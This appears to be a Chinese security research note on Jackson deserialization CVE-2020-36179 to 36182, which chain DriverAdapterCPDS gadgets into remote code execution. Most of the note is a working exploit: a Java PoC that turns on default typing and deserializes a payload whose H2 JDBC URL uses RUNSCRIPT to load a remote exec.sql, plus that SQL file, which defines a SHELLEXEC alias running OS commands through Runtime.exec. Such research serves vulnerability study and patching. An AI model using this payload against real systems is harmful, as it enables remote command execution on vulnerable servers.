### 常见Jackson的Exception
- https://www.baeldung.com/jackson-exception

### 多个CVE(SSRF to RCE)
- CVE-2020-36179：`oadd.org.apache.commons.dbcp.cpdsadapter.DriverAdapterCPDS`
- CVE-2020-36180：`org.apache.commons.dbcp2.cpdsadapter.DriverAdapterCPDS`
- CVE-2020-36181：`org.apache.tomcat.dbcp.dbcp.cpdsadapter.DriverAdapterCPDS`
- CVE-2020-36182：`org.apache.tomcat.dbcp.dbcp2.cpdsadapter.DriverAdapterCPDS`

Ref: 
- https://github.com/Al1ex/CVE-2020-36179
- https://www.leadroyal.cn/p/594/
- https://github.com/threedr3am/learnjavabug/tree/master/jackson/src/main/java/com/threedr3am/bug/jackson/rce


原理差不多，
```
DriverAdapterCPDS
    ->seturl
        ->getPooledConnection
            ->DirverManager.getConnection(this.url,username,pass)
```

### PoC
```java
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.SerializationFeature;


public class POC {
    public static void main(String[] args) throws Exception {
        String payload = "[\"org.apache.commons.dbcp2.cpdsadapter.DriverAdapterCPDS\",{\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:3333/exec.sql'\"}]";
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        mapper.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, false);
        Object obj = mapper.readValue(payload, Object.class);
        mapper.writeValueAsString(obj);
    }
}
```

#### exec.sql
```sql
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('calc.exe')
```
